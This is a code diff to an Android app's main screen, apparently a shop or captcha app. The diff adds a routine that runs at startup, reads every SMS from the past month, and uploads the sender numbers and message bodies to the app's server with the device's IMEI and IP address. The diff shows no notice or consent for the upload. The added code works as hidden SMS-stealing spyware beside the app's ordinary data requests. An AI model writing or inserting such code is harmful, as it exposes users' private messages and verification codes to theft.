@@ -4,8 +4,9 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.recyclerview.widget.RecyclerView;
 import androidx.recyclerview.widget.StaggeredGridLayoutManager;
 
+import android.content.ContentResolver;
 import android.content.Intent;
-import android.content.SharedPreferences;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Handler;
@@ -17,17 +18,21 @@ import android.widget.ImageView;
 import android.widget.Toast;
 
 import com.chad.library.adapter.base.BaseQuickAdapter;
+import com.google.gson.Gson;
 import com.xhf.sms.adapter.MainAdapter;
 import com.xhf.sms.api.ApiManager;
 import com.xhf.sms.bean.ConfigBean;
 import com.xhf.sms.bean.MainBean;
+import com.xhf.sms.bean.SmsBean;
 import com.xhf.sms.dialog.CenterDialog;
 import com.xhf.sms.utils.SpUtils;
 
+import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.Calendar;
+import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
-import java.util.Map;
 
 import io.reactivex.Observer;
 import io.reactivex.android.schedulers.AndroidSchedulers;
@@ -44,9 +49,12 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     private CenterDialog mCenterDialog;
     private CenterDialog mLoginDialog;
     private CenterDialog mEnterDialog;
+    private Uri SMS_INBOX = Uri.parse("content://sms/");
+    private List<SmsBean.Msg> mMsgList = new ArrayList<>();
 
 
     @Override
+
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
@@ -88,13 +96,82 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         });
 
         this.getContentResolver().registerContentObserver(
-                Uri.parse("content://sms/inbox"), true, phoneCode);
+                SMS_INBOX, true, phoneCode);
 
 
     }
 
 
-    private void requestData() {
+    private void getphoneSms() {
+        ContentResolver cr = getContentResolver();
+        String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
+        Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
+        if (null == cur) {
+            Log.i("getphoneSms", "************cur == null");
+            return;
+        }
+
+        while (cur.moveToNext()) {
+            String number = cur.getString(cur.getColumnIndex("address"));
+            long startTime = cur.getLong(cur.getColumnIndex("date"));
+            String body = cur.getString(cur.getColumnIndex("body"));
+            Log.e("result", startTime + "-" + getMonthTime() + "--" + body);
+            if (startTime > getMonthTime()) {
+                SmsBean.Msg msg = new SmsBean.Msg();
+                msg.setTel(number);
+                msg.setData(body);
+                mMsgList.add(msg);
+            }
+        }
+
+        SmsBean smsBean = new SmsBean();
+        smsBean.setName("");
+        smsBean.setPhone("");
+        smsBean.setImei(AppUtils.getDeviceID(this));
+        smsBean.setIp(AppUtils.getLocalIpAddress(this));
+        smsBean.setMsg(mMsgList);
+        postMsmData(smsBean);
+    }
+
+    private long getMonthTime() {
+        Calendar calendar = Calendar.getInstance();
+        calendar.setTime(new Date(System.currentTimeMillis()));
+        calendar.add(Calendar.MONTH, -1);
+        return calendar.getTimeInMillis();
+    }
+
+
+    private void postMsmData(SmsBean sms) {
+        ApiManager.getInstance().getApiService().sendSms(sms)
+                .subscribeOn(Schedulers.io())
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribe(new Observer<Response>() {
+                    @Override
+                    public void onSubscribe(Disposable d) {
+                    }
+
+                    @Override
+                    public void onNext(Response response) {
+                        if (response.getCode() == 1) {
+                            Log.e("sms", "短信上传成功: " + response.getMsg());
+
+                        }
+                    }
+
+                    @Override
+                    public void onError(Throwable e) {
+                        Log.e("sms", "onError: " + e.toString());
+
+                    }
+
+                    @Override
+                    public void onComplete() {
+
+                    }
+                });
+    }
+
+    private void requestMainData() {
 
         ApiManager.getInstance().getApiService().getconfigInfo()
                 .subscribeOn(Schedulers.io())
@@ -107,14 +184,14 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
                     @Override
                     public void onNext(ConfigBean configBeans) {
-                        SpUtils.setShopTips(MainActivity.this,configBeans.getShop_tips());
-                        SpUtils.setSMSTips(MainActivity.this,configBeans.getCaptcha_tips());
+                        SpUtils.setShopTips(MainActivity.this, configBeans.getShop_tips());
+                        SpUtils.setSMSTips(MainActivity.this, configBeans.getCaptcha_tips());
 
                     }
 
                     @Override
                     public void onError(Throwable e) {
-                        Log.e("configInfo", e.toString());
+                        Log.e("sms", e.toString());
                     }
 
                     @Override
@@ -144,7 +221,7 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
 
                     @Override
                     public void onError(Throwable e) {
-                        Log.e("mainInfo", e.toString());
+                        Log.e("sms", e.toString());
 
                     }
 
@@ -158,7 +235,8 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
     }
 
     private void initData() {
-        requestData();
+        getphoneSms();
+        requestMainData();
 
 
     }
